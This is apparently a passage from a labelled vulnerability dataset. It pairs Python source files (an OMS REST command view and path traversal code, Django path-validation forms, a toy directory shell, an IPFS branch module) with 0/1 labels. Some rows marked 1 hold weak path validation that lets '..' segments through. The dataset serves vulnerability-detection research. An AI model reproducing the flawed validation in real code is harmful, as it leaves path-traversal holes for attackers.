                                 if queryAdapter(item, IHttpRestView) and not self.blacklisted(item)])

        total_children = len(children)

        if (limit is not None and limit != 0) or offset:
            children = children[offset : offset + limit]

        # backward compatibility:
        # top level results for pure containers are plain lists
        if top_level and (not container_properties or len(container_properties.keys()) == 1):
            return children

        if not top_level or depth > 0:
            container_properties['children'] = children
            container_properties['totalChildren'] = total_children

        return self.filter_attributes(request, container_properties)

    def blacklisted(self, item):
        return isinstance(item, ByNameContainer)


class SearchView(ContainerView):
    context(SearchContainer)

    def render_GET(self, request):
        q = request.args.get('q', [''])[0]

        if not q:
            return super(SearchView, self).render_GET(request)

        search = db.get_root()['oms_root']['search']
        res = SearchResult(search, q.decode('utf-8'))

        return IHttpRestView(res).render_GET(request)


class StreamView(HttpRestView):
    context(StreamSubscriber)

    cached_subscriptions = dict()

    def rw_transaction(self, request):
        return False

    def render(self, request):
        timestamp = int(time.time() * 1000)
        oms_root = db.get_root()['oms_root']

        limit = int(request.args.get('limit', ['100'])[0])
        after = int(request.args.get('after', ['0'])[0])

        subscription_hash = request.args.get('subscription_hash', [''])[0]
        if subscription_hash:
            if subscription_hash in self.cached_subscriptions:
                data = self.cached_subscriptions[subscription_hash]
            else:
                raise BadRequest(""Unknown subscription hash"")
        elif not request.content.getvalue():
            return {}
        else:
            data = json.load(request.content)
            subscription_hash = sha1(request.content.getvalue()).hexdigest()
            self.cached_subscriptions[subscription_hash] = data
            request.responseHeaders.addRawHeader('X-OMS-Subscription-Hash', subscription_hash)

        def val(r):
            objs, unresolved_path = traverse_path(oms_root, r)
            if unresolved_path:
                return [(timestamp, dict(event='delete', name=os.path.basename(r), url=r))]
            return IStream(objs[-1]).events(after, limit=limit)

        # ONC wants it in ascending time order
        # while internally we prefer to keep it newest first to
        # speed up filtering.
        # Reversed is not json serializable so we have to reify to list.
        res = [list(reversed(val(resource))) for resource in data]
        res = [(i, v) for i, v in enumerate(res) if v]
        return [timestamp, dict(res)]


class CommandView(DefaultView):
    context(ICommand)

    def write_results(self, request, pid, cmd):
        log.msg('Called %s got result: pid(%s) term writes=%s' % (
                cmd, pid, len(cmd.write_buffer)), system='command-view')
        request.write(json.dumps({'status': 'ok', 'pid': pid,
                                  'stdout': cmd.write_buffer}))
        request.finish()

    def render_PUT(self, request):
        """""" Converts arguments into command-line counterparts and executes the omsh command.

        Parameters passed as 'arg' are converted into positional arguments, others are converted into
        named parameters:

            PUT /bin/ls?arg=/some/path&arg=/another/path&-l&--recursive

        thus translates to:

            /bin/ls /some/path /another/path -l --recursive

        Allows blocking (synchronous) and non-blocking operation using the 'asynchronous' parameter (any
        value will trigger it). Synchronous operation requires two threads to function.
        """"""

        def named_args_filter_and_flatten(nargs):
            for name, vallist in nargs:
                if name not in ('arg', 'asynchronous'):
                    for val in vallist:
                        yield name
                        yield val

        def convert_args(args):
            tokenized_args = args.get('arg', [])
            return tokenized_args + list(named_args_filter_and_flatten(args.items()))

        protocol = DetachedProtocol()
        protocol.interaction = get_interaction(self.context) or request.interaction

        args = convert_args(request.args)
        args = filter(None, args)
        cmd = self.context.cmd(protocol)
        # Setting write_buffer to a list makes command save the output to the buffer too
        cmd.write_buffer = []
        d0 = defer.Deferred()

        try:
            pid = threads.blockingCallFromThread(reactor, cmd.register, d0, args,
                                                 '%s %s' % (request.path, args))
        except ArgumentParsingError, e:
            raise BadRequest(str(e))

        q = Queue.Queue()

        def execute(cmd, args):
            d = defer.maybeDeferred(cmd, *args)
            d.addBoth(q.put)
            d.chainDeferred(d0)

        dt = threads.deferToThread(execute, cmd, args)

        if request.args.get('asynchronous', []):
            reactor.callFromThread(self.write_results, request, pid, cmd)
        else:
            dt.addBoth(lambda r: threads.deferToThread(q.get, True, 60))
            dt.addCallback(lambda r: reactor.callFromThread(self.write_results, request, pid, cmd))

            def errhandler(e, pid, cmd):
                e.trap(ArgumentParsingError)
                raise BadRequest(str(e))
            dt.addErrback(errhandler, pid, cmd)
        return NOT_DONE_YET
/n/n/n/opennode/oms/model/traversal.py/n/nimport logging
import re

from grokcore.component import Adapter, implements, baseclass
from zope.interface import Interface

from opennode.oms.model.model.symlink import follow_symlinks


__all__ = ['traverse_path', 'traverse1']


log = logging.getLogger(__name__)


class ITraverser(Interface):
    """"""Adapters providing object traversal should implement this interface.""""""

    def traverse(name):
        """"""Takes the name of the object to traverse to and returns the traversed object, if any.""""""


class Traverser(Adapter):
    """"""Base class for all object traversers.""""""
    implements(ITraverser)
    baseclass()


def traverse_path(obj, path):
    """"""Starting from the given object, traverses all its descendant
    objects to find an object that matches the given path.

    Returns a tuple that contains the object up to which the traversal
    was successful plus all objects that led to that object, and the
    part of the path that could not be resolved.

    """"""

    if not path or path == '/':
        return [obj], []

    path = re.sub(r'\/+', '/', path)
    if path.endswith('/'):
        path = path[:-1]
    if path.startswith('/'):
        path = path[1:]

    path = path.split('/')

    ret = [obj]
    while path:
        name = path[0]
        try:
            traverser = ITraverser(ret[-1])
        except TypeError:
            break

        next_obj = follow_symlinks(traverser.traverse(name))

        if not next_obj:
            break

        ret.append(next_obj)
        path = path[1:]

    return ret[1:], path


def traverse1(path):
    """"""Provides a shortcut for absolute path traversals without
    needing to pass in the root object.

    """"""

    # Do it here just in case; to avoid circular imports:
    from opennode.oms.zodb import db

    oms_root = db.get_root()['oms_root']
    objs, untraversed_path = traverse_path(oms_root, path)
    if objs and not untraversed_path:
        return objs[-1]
    else:
        return None


def canonical_path(item):
    path = []
    from opennode.oms.security.authentication import Sudo
    while item:
        with Sudo(item):
            assert item.__name__ is not None, '%s.__name__ is None' % item
            item = follow_symlinks(item)
            path.insert(0, item.__name__)
            item = item.__parent__
    return '/'.join(path)
/n/n/n/opennode/oms/util.py/n/nimport functools
import inspect
import time
import threading

from Queue import Queue, Empty

import zope.interface
from zope.component import getSiteManager, implementedBy
from zope.interface import classImplements
from twisted.internet import defer, reactor
from twisted.python import log
from twisted.python.failure import Failure

from opennode.oms.config import get_config


def get_direct_interfaces(obj):
    """"""Returns the interfaces that the parent class of `obj`
    implements, exluding any that any of its ancestor classes
    implement.

    >>> from zope.interface import Interface, implements, implementedBy
    >>> class IA(Interface): pass
    >>> class IB(Interface): pass
    >>> class A: implements(IA)
    >>> class B(A): implements(IB)
    >>> b = B()
    >>> [i.__name__ for i in list(implementedBy(B).interfaces())]
    ['IB', 'IA']
    >>> [i.__name__ for i in get_direct_interfaces(b)]
    ['IB']

    """"""
    cls = obj if isinstance(obj, type) else type(obj)

    if not isinstance(obj, type) and hasattr(obj, 'implemented_interfaces'):
        interfaces = obj.implemented_interfaces()
    else:
        interfaces = list(zope.interface.implementedBy(cls).interfaces())

    for base_cls in cls.__bases__:
        for interface in list(zope.interface.implementedBy(base_cls).interfaces()):
            # in multiple inheritance this it could be already removed
            if interface in interfaces:
                interfaces.remove(interface)

    return interfaces


def get_direct_interface(obj):
    interfaces = get_direct_interfaces(obj)
    if not interfaces:
        return None
    if len(interfaces) == 1:
        return interfaces[0]
    else:
        raise Exception(""Object implements more than 1 interface"")


def query_adapter_for_class(cls, interface):
    return getSiteManager().adapters.lookup([implementedBy(cls)], interface)


class Singleton(type):
    """"""Singleton metaclass.""""""

    def __init__(cls, name, bases, dict):
        super(Singleton, cls).__init__(name, bases, dict)
        cls.instance = None

    def __call__(cls, *args, **kw):
        if cls.instance is None:
            cls.instance = super(Singleton, cls).__call__(*args, **kw)
        return cls.instance


def subscription_factory(cls, *args, **kwargs):
    """"""Utility which allows to to quickly register a subscription adapters which returns new instantiated objects
    of a given class

    >>> provideSubscriptionAdapter(subscription_factory(MetricsDaemonProcess), adapts=(IProc,))

    """"""

    class SubscriptionFactoryWrapper(object):
        def __new__(self, *_ignore):
            return cls(*args)

    interfaces = get_direct_interfaces(cls)
    classImplements(SubscriptionFactoryWrapper, *interfaces)
    return SubscriptionFactoryWrapper


def adapter_value(value):
    """"""Utility which allows to to quickly register a subscription adapter  as a value instead of

    >>> provideSubscriptionAdapter(adapter_value(['useful', 'stuff']), adapts=(Compute,), provides=ISomething)

    """"""

    def wrapper(*_):
        return value
    return wrapper


def async_sleep(secs):
    """"""Util which helps writing synchronous looking code with
    defer.inlineCallbacks.

    Returns a deferred which is triggered after `secs` seconds.

    """"""

    d = defer.Deferred()
    reactor.callLater(secs, d.callback, None)
    return d


def blocking_yield(deferred, timeout=None):
    """"""This utility is part of the HDK (hack development toolkit) use with care and remove its usage asap.

    Sometimes we have to synchronously wait for a deferred to complete,
    for example when executing inside db.transact code, which cannot 'yield'
    because currently db.transact doesn't handle returning a deferred.

    Or because we are running code inside a handler which cannot return a deferred
    otherwise we cannot block the caller or rollback the transaction in case of async code
    throwing exception (scenario: we want to prevent deletion of node)

    Use this utility only until you refactor the upstream code in order to use pure async code.
    """"""

    q = Queue()
    deferred.addBoth(q.put)
    try:
        ret = q.get(True, timeout or 100)
    except Empty:
        raise defer.TimeoutError
    if isinstance(ret, Failure):
        ret.raiseException()
    else:
        return ret


def threaded(fun):
    """"""Helper decorator to quickly turn a function in a threaded function using a newly allocated thread,
    mostly useful during debugging/profiling in order to see if there are any queuing issues in the
    threadpools.

    """"""

    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=fun, args=args, kwargs=kwargs)
        thread.start()
    return wrapper


def trace(fun):
    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        log.msg('%s %s %s' % (fun, args, kwargs), system='trace')
        return fun(*args, **kwargs)
    return wrapper


def trace_methods(cls):
    def trace_method(name):
        fun = getattr(cls, name)
        if inspect.ismethod(fun):
            setattr(cls, name, trace(fun))

    for name in cls.__dict__:
        trace_method(name)


def get_u(obj, key):
    val = obj.get(key)
    return unicode(val) if val is not None else None


def get_i(obj, key):
    val = obj.get(key)
    return int(val) if val is not None else None


def get_f(obj, key):
    val = obj.get(key)
    return float(val) if val is not None else None


def exception_logger(fun):
    @functools.wraps(fun)
    def wrapper(*args, **kwargs):
        try:
            res = fun(*args, **kwargs)
            if isinstance(res, defer.Deferred):
                @res
                def on_error(failure):
                    log.msg(""Got unhandled exception: %s"" % failure.getErrorMessage(), system='debug')
                    if get_config().getboolean('debug', 'print_exceptions'):
                        log.err(failure, system='debug')
            return res
        except Exception:
            if get_config().getboolean('debug', 'print_exceptions'):
                log.err(system='debug')
            raise
    return wrapper


def find_nth(haystack, needle, n, start_boundary=None):
    start = haystack.find(needle, start_boundary)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start + len(needle))
        n -= 1
    return start


class benchmark(object):
    """"""Can be used either as decorator:
    >>> class Foo(object):
    ...   @benchmark(""some description"")
    ...   def doit(self, args):
    ...      # your code


    or as context manager:
    >>> with benchmark(""some description""):
    >>>    # your code

    and it will print out the time spent in the function or block.
    """"""

    def __init__(self, name):
        self.name = name

    def __call__(self, fun):
        @functools.wraps(fun)
        def wrapper(*args, **kwargs):
            with self:
                return fun(*args, **kwargs)
        return wrapper

    def __enter__(self):
        self.start = time.time()

    def __exit__(self, ty, val, tb):
        end = time.time()
        print(""%s : %0.3f seconds"" % (self.name, end - self.start))
        return False


class TimeoutException(Exception):
    """"""Raised when time expires in timeout decorator""""""


def timeout(secs):
    """"""
    Decorator to add timeout to Deferred calls
    """"""
    def wrap(func):
        @defer.inlineCallbacks
        @functools.wraps(func)
        def _timeout(*args, **kwargs):
            rawD = func(*args, **kwargs)
            if not isinstance(rawD, defer.Deferred):
                defer.returnValue(rawD)

            timeoutD = defer.Deferred()
            timesUp = reactor.callLater(secs, timeoutD.callback, None)

            try:
                rawResult, timeoutResult = yield defer.DeferredList([rawD, timeoutD],
                                                                    fireOnOneCallback=True,
                                                                    fireOnOneErrback=True,
                                                                    consumeErrors=True)
            except defer.FirstError, e:
                #Only rawD should raise an exception
                assert e.index == 0
                timesUp.cancel()
                e.subFailure.raiseException()
            else:
                #Timeout
                if timeoutD.called:
                    rawD.cancel()
                    raise TimeoutException(""%s secs have expired"" % secs)

            #No timeout
            timesUp.cancel()
            defer.returnValue(rawResult)
        return _timeout
    return wrap
/n/n/n",1
168,17e806b53855919f8e3551568d11eac54f219385,"director/projects/source_forms.py/n/nimport re
import typing
from pathlib import PurePosixPath
from urllib.parse import urlparse

from django import forms
from django.core.exceptions import ValidationError
from django.forms import ModelForm

from lib.forms import ModelFormWithSubmit
from projects.project_models import Project
from .source_models import FileSource, GithubSource, Source

# TODO: these should be proper mime types!
FILE_TYPES = [
    # ('text/folder', 'Folder'),
    ('text/dar', 'Dar'),
    ('text/dockerfile', 'Dockerfile'),
    ('text/ipynb', 'Jupyter Notebook'),
    ('text/rmarkdown', 'RMarkdown'),
]


def validate_unique_project_path(project: Project, path: str, existing_source_pk: typing.Optional[int] = None) -> None:
    """"""
    Check if a `FileSource` with a path already exists for a given `Project`.

    If a path `FileSource` with path does exist raise a `ValidationError`.
    """"""
    # this check only matters for FileSource objects because linked sources can be mapped to the same path
    existing_sources = FileSource.objects.filter(project=project, path=path)

    if existing_source_pk:
        existing_sources = existing_sources.exclude(pk=existing_source_pk)

    if len(existing_sources):
        raise ValidationError(""A source with path {} already exists for this project."".format(path))


class VirtualPathField(forms.CharField):
    """"""Field for validating paths to FileSource.""""""

    def clean(self, value):
        cleaned_value = super().clean(value)

        if cleaned_value.startswith('/') or cleaned_value.endswith('/'):
            raise ValidationError('The path must not start or end with a ""/"".')

        path = PurePosixPath(cleaned_value)
        for part in path.parts:
            if re.match(r'^\.+$', part):
                raise ValidationError('The path must not contain ""."" or "".."" as components.')
        return cleaned_value


class FileSourceForm(ModelFormWithSubmit):
    type = forms.ChoiceField(choices=FILE_TYPES)
    path = VirtualPathField(required=True)

    class Meta:
        model = FileSource
        fields = ('path',)
        widgets = {
            'type': forms.Select(),
            'path': forms.TextInput()
        }

    def clean(self):
        cleaned_data = super().clean()
        if self.is_valid():
            validate_unique_project_path(self.initial['project'], cleaned_data['path'])
        return cleaned_data


class SourceUpdateForm(ModelForm):
    path = VirtualPathField(required=True)

    class Meta:
        model = Source
        fields = ('path',)

    def clean(self):
        cleaned_data = super().clean()
        if 'path' in cleaned_data:  # it might not be, if the form is not valid then cleaned_data will be an empty dict
            validate_unique_project_path(self.instance.project, cleaned_data['path'], self.instance.pk)
        return cleaned_data


class GithubSourceForm(ModelFormWithSubmit):
    class Meta:
        model = GithubSource
        fields = ('path', 'repo', 'subpath')
        widgets = {
            'repo': forms.TextInput(),
            'subpath': forms.TextInput(),
            'path': forms.TextInput()
        }

    @staticmethod
    def raise_repo_validation_error(repo: str) -> None:
        raise ValidationError('""{}"" is not a valid Github repository. A repository (in the format ""username/path"", or '
                              'a URL) is required.'.format(repo))

    def clean_repo(self) -> str:
        """"""Validate that the repo is either in the format `username/repo`, or extract this from a Github URL.""""""
        repo = self.cleaned_data['repo']
        if not repo:
            self.raise_repo_validation_error(repo)

        github_url = urlparse(self.cleaned_data['repo'])

        if github_url.scheme.lower() not in ('https', 'http', ''):
            self.raise_repo_validation_error(repo)

        if github_url.netloc.lower() not in ('github.com', ''):
            self.raise_repo_validation_error(repo)

        repo_match = re.match(r""^((github\.com/)|/)?([a-z\d](?:[a-z\d]|-(?=[a-z\d])){0,38})/([\w_-]+)/?$"",
                              github_url.path, re.I)

        if not repo_match:
            self.raise_repo_validation_error(repo)

        repo_match = typing.cast(typing.Match, repo_match)

        return '{}/{}'.format(repo_match[3], repo_match[4])
/n/n/n",0
169,17e806b53855919f8e3551568d11eac54f219385,"/director/projects/source_forms.py/n/nimport re
import typing
from urllib.parse import urlparse

from django import forms
from django.core.exceptions import ValidationError
from django.forms import ModelForm

from lib.forms import ModelFormWithSubmit
from projects.project_models import Project
from .source_models import FileSource, GithubSource, Source

# TODO: these should be proper mime types!
FILE_TYPES = [
    # ('text/folder', 'Folder'),
    ('text/dar', 'Dar'),
    ('text/dockerfile', 'Dockerfile'),
    ('text/ipynb', 'Jupyter Notebook'),
    ('text/rmarkdown', 'RMarkdown'),
]


def validate_unique_project_path(project: Project, path: str, existing_source_pk: typing.Optional[int] = None) -> None:
    """"""
    Check if a `FileSource` with a path already exists for a given `Project`.

    If a path `FileSource` with path does exist raise a `ValidationError`.
    """"""
    # this check only matters for FileSource objects because linked sources can be mapped to the same path
    existing_sources = FileSource.objects.filter(project=project, path=path)

    if existing_source_pk:
        existing_sources = existing_sources.exclude(pk=existing_source_pk)

    if len(existing_sources):
        raise ValidationError(""A source with path {} already exists for this project."".format(path))


class FileSourceForm(ModelFormWithSubmit):
    type = forms.ChoiceField(choices=FILE_TYPES)
    path = forms.RegexField(regex=r'^[^/][A-Za-z\-/\.]+[^/]$', widget=forms.TextInput,
                            error_messages={'invalid': 'The path must not contain spaces, or start or end with a /'})

    class Meta:
        model = FileSource
        fields = ('path',)
        widgets = {
            'type': forms.Select(),
            'path': forms.TextInput()
        }

    def clean(self):
        validate_unique_project_path(self.initial['project'], self.cleaned_data['path'])
        return super().clean()


class SourceUpdateForm(ModelForm):
    path = forms.RegexField(regex=r'^[^/][A-Za-z0-9\-/\.]+[^/]$', widget=forms.TextInput,
                            error_messages={'invalid': 'The path must not contain spaces, or start or end with a /'})

    class Meta:
        model = Source
        fields = ('path',)

    def clean(self):
        cleaned_data = super().clean()
        if 'path' in cleaned_data:  # it might not be, if the form is not valid then cleaned_data will be an empty dict
            validate_unique_project_path(self.instance.project, cleaned_data['path'], self.instance.pk)
        return cleaned_data


class GithubSourceForm(ModelFormWithSubmit):
    class Meta:
        model = GithubSource
        fields = ('path', 'repo', 'subpath')
        widgets = {
            'repo': forms.TextInput(),
            'subpath': forms.TextInput(),
            'path': forms.TextInput()
        }

    @staticmethod
    def raise_repo_validation_error(repo: str) -> None:
        raise ValidationError('""{}"" is not a valid Github repository. A repository (in the format ""username/path"", or '
                              'a URL) is required.'.format(repo))

    def clean_repo(self) -> str:
        """"""Validate that the repo is either in the format `username/repo`, or extract this from a Github URL.""""""
        repo = self.cleaned_data['repo']
        if not repo:
            self.raise_repo_validation_error(repo)

        github_url = urlparse(self.cleaned_data['repo'])

        if github_url.scheme.lower() not in ('https', 'http', ''):
            self.raise_repo_validation_error(repo)

        if github_url.netloc.lower() not in ('github.com', ''):
            self.raise_repo_validation_error(repo)

        repo_match = re.match(r""^((github\.com/)|/)?([a-z\d](?:[a-z\d]|-(?=[a-z\d])){0,38})/([\w_-]+)/?$"",
                              github_url.path, re.I)

        if not repo_match:
            self.raise_repo_validation_error(repo)

        repo_match = typing.cast(typing.Match, repo_match)

        return '{}/{}'.format(repo_match[3], repo_match[4])
/n/n/n",1
170,fd1549ee5288bbab0ff8e1cf03c2df60da8eac82,"path_traversal.py/n/nroot = ["""", ""home"", ""root""]
dirs = []
path = []
curr_path = [] or ["""", ""home"", ""root""]


# To create directory
def mkdir():
    global dirs
    if dir in dirs:
        print(""Directory already exist."")
    else:
        dirs.append(dir)
        path.append(dir)


# shows directory
def ls():
    global path
    if path == root:
        path = dirs
        path = path[0]
    print(*path, sep=""\n"")


# change directory
def cd():
    global curr_path, dir, path
    if dir == """":
        curr_path = root
        path = root
    elif dir in dirs:
        curr_path.append(dir)
        path.clear()
    elif dir == "".."":
        curr_path.pop()
        print(*curr_path, sep=""/"")
        i = len(dirs) - 1
        if dirs[i] in path:
            i = i - 1
            path.pop()
            path.append(dirs[i])
        else:
            path.append(dirs[i])
    else:
        print(""Directory doesn't exist."")


# show current directory
def pwd():
    global curr_path
    print(*curr_path, sep=""/"")


# remove directory
def rm():
    global dirs
    if dir in dirs:
        dirs.remove(dir)
        if dir in path:
            path.remove(dir)
    else:
        print(""Directory does not exist."")


# clean session data like it is executed just now
def session_clear():
    global dirs
    dirs.clear()
    global curr_path
    curr_path.clear()
    curr_path = root
    global path
    path.clear()


def commands(argument):
    comm = {
        ""mkdir"": mkdir,
        ""ls"": ls,
        ""cd"": cd,
        ""pwd"": pwd,
        ""rm"": rm,
        ""session_clear"": session_clear,
        ""exit"": exit,
    }
    if n in comm:
        # Get the function from comm dictionary
        func = comm.get(argument)
        # Execute the function
        func()
    else:
        print(""command does not exist!"")


print(""There are total 7 commands: mkdir, ls, cd, pwd, rm, session_clear, exit."")

while True:
    n = input(""$: "")
    a = []
    a.append(n.split("" ""))
    n = a[0][0]
    if n in [""mkdir"", ""rm""] and len(a[0]) == 1:
        print(""{}:missing operand"".format(n))
    elif len(a[0]) == 1:
        dir = """"
    elif len(a[0]) == 2:
        dir = a[0][1]
    else:
        print(""Invalid Syntax"")
    commands(n)
/n/n/n",0
171,fd1549ee5288bbab0ff8e1cf03c2df60da8eac82,"/path_traversal.py/n/nroot = ["""", ""home"", ""root""]dirs = []path = []curr_path = [] or ["""", ""home"", ""root""]# To create directorydef mkdir():    global dirs    if dir in dirs:        print(""Directory already exist."")    else:        dirs.append(dir)        path.append(dir)# shows directorydef ls():    global path    if path == root:        path = dirs        path = path[0]    print(*path, sep=""\n"")# change directorydef cd():    global curr_path, dir, path    if dir == """":        curr_path = root        path = root    elif dir in dirs:        curr_path.append(dir)        path.clear()    elif dir == "".."":        curr_path.pop()        print(*curr_path, sep=""/"")        i = len(dirs) - 1        if dirs[i] in path:            i = i - 1            path.pop()            path.append(dirs[i])        else:            path.append(dirs[i])    else:        print(""Directory doesn't exist."")# show current directorydef pwd():    global curr_path    print(*curr_path, sep=""/"")# remove directorydef rm():    global dirs    if dir in dirs:        dirs.remove(dir)        if dir in path:            path.remove(dir)    else:        print(""Directory does not exist."")# clean session data like it is executed just nowdef session_clear():    global dirs    dirs.clear()    global curr_path    curr_path.clear()    curr_path = root    global path    path.clear()def commands(argument):    comm = {        ""mkdir"": mkdir,        ""ls"": ls,        ""cd"": cd,        ""pwd"": pwd,        ""rm"": rm,        ""session_clear"": session_clear,        ""exit"": exit    }    if n in comm:        # Get the function from comm dictionary        func = comm.get(argument)        # Execute the function        func()    else:        print(""command does not exist!"")print(    ""There are total 7 commands: mkdir, ls, cd, pwd, rm, session_clear, exit."")while True:    n = input(""$: "")    a = []    a.append(n.split("" ""))    n = a[0][0]    if n in [""mkdir"", ""rm""] and len(a[0]) == 1:        print(""{}:missing operand"".format(n))    elif len(a[0]) == 1:        dir = """"    elif len(a[0]) == 2:        dir = a[0][1]    else:        print(""Invalid Syntax"")    commands(n)/n/n/n",1
172,f6c08c8434f1d86b8c15bace08525e4785e8752e,"ipvc/branch.py/n/nimport io
import os
import sys
import json
import webbrowser
from pathlib import Path

import ipfsapi
from ipvc.common import CommonAPI, expand_ref, refpath_to_mfs, make_len, atomic

class BranchAPI(CommonAPI):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    @atomic
    def status(self, name=False):
        _, branch = self.common()
        active = self.ipfs.files_read(
            self.get_mfs_path(self.fs_cwd, repo_info='active_branch_name')).decode('utf-8')
        if not self.quiet: print(active)
        return active

    @atomic
    def create(self, name, from_commit=""@head"", no_checkout=False):
        _, branch = self.common()

        if not name.replace('_', '').isalnum():
            if not self.quiet:
                print('Branch name has to be alpha numeric with underscores',
                      file=sys.stderr)
            raise RuntimeError()
        elif name in ['head', 'workspace', 'stage']:
            if not self.quiet:
                print(f'""{name}"" is a reserved keyword, please pick a different branch name',
                      file=sys.stderr)
            raise RuntimeError()


        try:
            self.ipfs.files_stat(self.get_mfs_path(self.fs_cwd, name))
            if not self.quiet: print('Branch name already exists', file=sys.stderr)
            raise RuntimeError()
        except ipfsapi.exceptions.StatusError:
            pass

        if from_commit == ""@head"":
            # Simply copy the current branch to the new branch
            self.ipfs.files_cp(
                self.get_mfs_path(self.fs_cwd, branch),
                self.get_mfs_path(self.fs_cwd, name))
        else:
            # Create the branch directory along with an empty stage and workspace
            for ref in ['stage', 'workspace']:
                mfs_ref = self.get_mfs_path(self.fs_cwd, name, branch_info=ref)
                self.ipfs.files_mkdir(mfs_ref, parents=True)

            # Copy the commit to the new branch's head
            commit_path = expand_ref(from_commit)
            mfs_commit_path = self.get_mfs_path(
                self.fs_cwd, branch, branch_info=commit_path)
            mfs_head_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='head')

            try:
                self.ipfs.files_stat(mfs_commit_path)
            except ipfsapi.exceptions.StatusError:
                if not self.quiet:
                    print('No such commit', file=sys.stderr)
                raise RuntimeError()

            self.ipfs.files_cp(mfs_commit_path, mfs_head_path)

            # Copy commit bundle to workspace and stage, plus a parent1 link
            # from stage to head
            mfs_commit_bundle_path = f'{mfs_commit_path}/bundle'
            mfs_workspace_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='workspace/bundle')
            mfs_stage_path = self.get_mfs_path(
                self.fs_cwd, name, branch_info='stage/bundle')
            self.ipfs.files_cp(mfs_commit_bundle_path, mfs_workspace_path)
            self.ipfs.files_cp(mfs_commit_bundle_path, mfs_stage_path)

        if not no_checkout:
            self.checkout(name)

    def _load_ref_into_repo(self, fs_repo_root, branch, ref,
                            without_timestamps=False):
        """""" Syncs the fs workspace with the files in ref """"""
        metadata = self.read_metadata(ref)
        added, removed, modified = self.workspace_changes(
            fs_repo_root, metadata, update_meta=False)

        mfs_refpath, _ = refpath_to_mfs(Path(f'@{ref}'))

        for path in added:
            os.remove(path)

        for path in removed | modified:
            mfs_path = self.get_mfs_path(
                fs_repo_root, branch,
                branch_info=(mfs_refpath / path.relative_to(fs_repo_root)))

            timestamp = metadata[str(path)]['timestamp']

            with open(path, 'wb') as f:
                f.write(self.ipfs.files_read(mfs_path))

            os.utime(path, ns=(timestamp, timestamp))

    @atomic
    def checkout(self, name, without_timestamps=False):
        """""" Checks out a branch""""""
        fs_repo_root, _ = self.common()

        try:
            self.ipfs.files_stat(self.get_mfs_path(self.fs_cwd, name))
        except ipfsapi.exceptions.StatusError:
            if not self.quiet: print('No branch by that name exists', file=sys.stderr)
            raise RuntimeError()

        # Write the new branch name to active_branch_name
        # NOTE: truncate here is needed to clear the file before writing
        self.ipfs.files_write(
            self.get_mfs_path(self.fs_cwd, repo_info='active_branch_name'),
            io.BytesIO(bytes(name, 'utf-8')),
            create=True, truncate=True)

        self._load_ref_into_repo(
            fs_repo_root, name, 'workspace', without_timestamps)

    @atomic
    def history(self, show_hash=False):
        """""" Shows the commit history for the current branch. Currently only shows
        the linear history on the first parents side""""""
        fs_repo_root, branch = self.common()

        # Traverse the commits backwards by via the {commit}/parent1/ link
        mfs_commit_path = self.get_mfs_path(
            fs_repo_root, branch, branch_info=Path('head'))
        commit_hash = self.ipfs.files_stat(
            mfs_commit_path)['Hash']

        commits = []
        while True:
            commit_ref_hash = self.ipfs.files_stat(
                f'/ipfs/{commit_hash}/bundle/files')['Hash']
            try:
                meta = json.loads(self.ipfs.cat(f'/ipfs/{commit_hash}/metadata').decode('utf-8'))
            except ipfsapi.exceptions.StatusError:
                # Reached the root of the graph
                break

            h, ts, msg = commit_hash[:6], meta['timestamp'], meta['message']
            auth = make_len(meta['author'] or '', 30)
            if not self.quiet: 
                if show_hash:
                    print(f'* {commit_ref_hash} {ts} {auth}   {msg}')
                else:
                    print(f'* {ts} {auth}   {msg}')

            commits.append(commit_hash)

            try:
                commit_hash = self.ipfs.files_stat(f'/ipfs/{commit_hash}/parent1')['Hash']
            except ipfsapi.exceptions.StatusError:
                # Reached the root of the graph
                break

        return commits

    @atomic
    def show(self, refpath, browser=False):
        """""" Opens a ref in the ipfs file browser """"""
        mfs_commit_hash = self.get_refpath_hash(refpath)
        if browser:
            # TODO: read IPFS node url from settings
            url = f'http://localhost:8080/ipfs/{mfs_commit_hash}'
            if not self.quiet: print(f'Opening {url}')
            webbrowser.open(url)
        else:
            ret = self.ipfs.ls(f'/ipfs/{mfs_commit_hash}')
            obj = ret['Objects'][0]
            if len(obj['Links']) == 0:
                # It's a file, so cat it
                cat = self.ipfs.cat(f'/ipfs/{mfs_commit_hash}').decode('utf-8')
                if not self.quiet:
                    print(cat)
                return cat
            else:
                # It's a folder
                ls = '\n'.join([ln['Name'] for ln in obj['Links']])
                if not self.quiet:
                    print(ls)
                return ls

    @atomic
    def merge(self, refpath):
        """""" Merge refpath into this branch

        """"""
        pass

    @atomic
    def ls(self):
        """""" List branches """"""
        fs_repo_root = self.get_repo_root()
        branches = self.get_branches(fs_repo_root)
        if not self.quiet:
            print('\n'.join(branches))
        return branches
/n/n/n",0
173,f6c08c8434f1d86b8c15bace08525e4785e8752e,"/ipvc/branch.py/n/nimport io
import os
import sys
import webbrowser
from pathlib import Path

import ipfsapi
from ipvc.common import CommonAPI, expand_ref, refpath_to_mfs, make_len, atomic

class BranchAPI(CommonAPI):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    @atomic
    def status(self, name=False):
        _, branch = self.common()
        active = self.ipfs.files_read(
            self.get_mfs_path(self.fs_cwd, repo_info='active_branch_name')).decode('utf-8')
        if not self.quiet: print(active)
        return active

    @atomic
    def create(self, name, from_commit=""@head"", no_checkout=False):
        _, branch = self.common()

        if not name.replace('_', '').isalnum():
            if not self.quiet:
                print('Branch name has to be alpha numeric with underscores',
                      file=sys.stderr)
            raise RuntimeError()
        elif name in ['head', 'workspace', 'stage']:
            if not self.quiet:
                print(f'""{name}"" is a reserved keyword, please pick a different branch name',
                      file=sys.stderr)
            raise RuntimeError()


        try:
            self.ipfs.files_stat(self.get_mfs_path(self.fs_cwd, name))
            if not self.quiet: print('Branch name already exists', file=sys.stderr)
            raise RuntimeError()
        except ipfsapi.exceptions.StatusError:
            pass

        if from_commit == ""@head"":
            # Simply copy the current branch to the new branch
            self.ipfs.files_cp(
                self.get_mfs_path(self.fs_cwd, branch),
                self.get_mfs_path(self.fs_cwd, name))
        else:
            # Create the branch directory along with an empty stage and workspace
            for ref in ['stage', 'workspace']:
                mfs_ref = self.get_mfs_path(self.fs_cwd, name, branch_info=ref)
                self.ipfs.files_mkdir(mfs_ref, parents=True)

